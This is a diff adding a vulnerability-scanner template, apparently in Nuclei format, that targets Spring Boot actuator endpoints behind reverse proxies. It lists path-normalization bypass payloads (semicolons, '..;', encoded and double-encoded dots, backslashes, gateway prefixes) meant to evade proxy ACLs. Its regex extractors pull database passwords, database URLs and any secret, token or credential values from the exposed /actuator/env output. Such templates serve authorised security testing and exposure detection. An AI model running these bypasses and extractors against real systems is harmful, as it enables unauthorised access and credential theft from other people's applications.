@@ -1,0 +1,100 @@
+id: springboot-actuator-bypass
+
+info:
+  name: Spring Boot Actuator Path Normalization Bypass
+  author: custom
+  severity: high
+  description: |
+    Tests for Spring Boot actuator endpoints behind reverse proxies using
+    path normalization bypass techniques. Standard /actuator/* paths are
+    often blocked by nginx/Apache rules, but semicolons, double encoding,
+    and dot-segment tricks bypass path-based ACLs while Spring still routes
+    them correctly.
+  tags: springboot,actuator,bypass,misconfig
+
+http:
+  - method: GET
+    path:
+      # Semicolon insertion (Tomcat path parameter)
+      - "{{BaseURL}}/;/actuator/env"
+      - "{{BaseURL}}/;/actuator/heapdump"
+      - "{{BaseURL}}/;/actuator/configprops"
+      - "{{BaseURL}}/;/actuator/mappings"
+      - "{{BaseURL}}/;/actuator/beans"
+      - "{{BaseURL}}/;/actuator/loggers"
+      - "{{BaseURL}}/;/actuator/threaddump"
+      # Double dot-segment with semicolon
+      - "{{BaseURL}}/..;/actuator/env"
+      - "{{BaseURL}}/..;/actuator/heapdump"
+      - "{{BaseURL}}/..;/actuator/configprops"
+      - "{{BaseURL}}/..;/actuator/mappings"
+      # URL-encoded dot
+      - "{{BaseURL}}/%2e/actuator/env"
+      - "{{BaseURL}}/%2e/actuator/heapdump"
+      - "{{BaseURL}}/%2e/actuator/configprops"
+      # Double URL-encoded dot
+      - "{{BaseURL}}/%252e/actuator/env"
+      - "{{BaseURL}}/%252e/actuator/heapdump"
+      # Path with trailing semicolon
+      - "{{BaseURL}}/actuator;/env"
+      - "{{BaseURL}}/actuator;/heapdump"
+      - "{{BaseURL}}/actuator;/configprops"
+      # Backslash normalization (IIS/Tomcat)
+      - "{{BaseURL}}/actuator%5c/env"
+      # Via API gateway prefix
+      - "{{BaseURL}}/api/actuator/env"
+      - "{{BaseURL}}/api/..;/actuator/env"
+      - "{{BaseURL}}/api/;/actuator/env"
+      # Via management context path
+      - "{{BaseURL}}/manage/actuator/env"
+      - "{{BaseURL}}/management/actuator/env"
+      - "{{BaseURL}}/admin/actuator/env"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "spring.datasource"
+          - "spring.jpa"
+          - "spring.security"
+          - "activeProfiles"
+          - "propertySources"
+          - "configuredLevel"
+          - "contextPath"
+          - "server.port"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "application/vnd.spring-boot.actuator"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: db_password
+        part: body
+        regex:
+          - '"spring\.datasource\.password"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"'
+        group: 1
+
+      - type: regex
+        name: db_url
+        part: body
+        regex:
+          - '"spring\.datasource\.url"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"'
+        group: 1
+
+      - type: regex
+        name: secrets
+        part: body
+        regex:
+          - '"(password|secret|key|token|credential)[^"]*"\s*:\s*\{[^}]*"value"\s*:\s*"([^*][^"]+)"'
+        group: 2
